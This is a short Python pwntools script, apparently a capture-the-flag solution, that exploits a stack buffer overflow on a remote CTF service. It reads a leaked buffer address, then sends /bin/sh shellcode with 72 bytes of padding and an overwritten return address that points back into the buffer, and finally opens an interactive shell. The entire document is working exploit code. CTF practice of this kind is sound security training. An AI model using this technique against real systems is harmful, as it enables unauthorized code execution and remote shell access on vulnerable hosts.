from pwn import *

#r = remote("127.0.0.1", 8888)
r = remote("ctf.adl.csie.ncu.edu.tw", 11003)
context.arch = "amd64"

r.recvuntil("is ")
buf_addr = int(r.recv(14).strip(), 16)
r.recvuntil("\n")

#raw_input('data')
print shellcraft.sh()
print asm(shellcraft.sh())
r.sendline(asm(shellcraft.sh()) + "a" * 72 + p64(buf_addr))
r.interactive()

